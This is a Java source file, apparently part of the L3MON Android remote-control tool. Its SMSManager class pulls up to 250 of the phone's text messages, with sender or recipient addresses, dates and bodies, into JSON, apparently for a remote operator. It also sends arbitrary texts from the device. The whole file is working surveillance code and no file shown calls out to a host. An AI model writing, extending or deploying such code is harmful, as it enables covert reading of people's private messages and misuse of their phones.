package com.etechd.l3mon.features.sms;

import android.Manifest;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;

import com.etechd.l3mon.core.L3monApp;
import com.etechd.l3mon.core.permissions.PermissionManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public final class SMSManager {

    private static final String TAG = "SMSManager";
    private static final Uri SMS_URI = Uri.parse("content://sms/");
    private static final int MAX_RESULTS = 250;
    private static final String SORT_ORDER = "date DESC";
    private static final String[] PROJECTION = new String[]{
            "_id",
            "thread_id",
            "address",
            "body",
            "date",
            "read",
            "type"
    };

    private SMSManager() {
    }

    public static JSONObject getsms() {
        JSONObject response = new JSONObject();
        JSONArray smsArray = new JSONArray();
        putSafe(response, "smslist", smsArray);

        Context context = L3monApp.getContext();
        if (context == null) {
            putSafe(response, "error", "Application context unavailable");
            return response;
        }

        if (!PermissionManager.canIUse(Manifest.permission.READ_SMS)) {
            putSafe(response, "error", "READ_SMS permission not granted");
            return response;
        }

        Cursor cursor = null;
        int fetched = 0;

        try {
            cursor = context.getContentResolver().query(SMS_URI, PROJECTION, null, null, SORT_ORDER);
            if (cursor != null) {
                while (cursor.moveToNext() && fetched < MAX_RESULTS) {
                    JSONObject smsObject = new JSONObject();
                    putSafe(smsObject, "body", safeGetString(cursor, "body"));
                    putSafe(smsObject, "date", safeGetString(cursor, "date"));
                    putSafe(smsObject, "read", safeGetString(cursor, "read"));

                    String type = safeGetString(cursor, "type");
                    putSafe(smsObject, "type", type);

                    String address = safeGetString(cursor, "address");
                    if (TextUtils.isEmpty(address)) {
                        address = "unknown";
                    }
                    putSafe(smsObject, "address", address);

                    smsArray.put(smsObject);
                    fetched++;
                }

                putSafe(response, "total", smsArray.length());
                putSafe(response, "truncated", !cursor.isAfterLast());
            }
        } catch (SecurityException se) {
            Log.e(TAG, "SMS permission denied", se);
            putSafe(response, "error", "READ_SMS permission denied");
        } catch (Exception e) {
            Log.e(TAG, "Error fetching SMS", e);
            putSafe(response, "error", "Unable to read SMS: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        return response;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        if (TextUtils.isEmpty(phoneNo) || TextUtils.isEmpty(msg)) {
            Log.w(TAG, "Phone number or message empty");
            return false;
        }

        if (!PermissionManager.canIUse(Manifest.permission.SEND_SMS)) {
            Log.w(TAG, "SEND_SMS permission not granted");
            return false;
        }

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            Log.e(TAG, "Error sending SMS", ex);
            return false;
        }
    }

    private static String safeGetString(Cursor cursor, String column) {
        int index = cursor.getColumnIndex(column);
        if (index < 0) {
            return "";
        }
        try {
            return cursor.getString(index);
        } catch (Exception e) {
            Log.w(TAG, "Failed to read column " + column, e);
            return "";
        }
    }

    private static void putSafe(JSONObject object, String key, Object value) {
        try {
            object.put(key, value);
        } catch (JSONException ignored) {
        }
    }
}
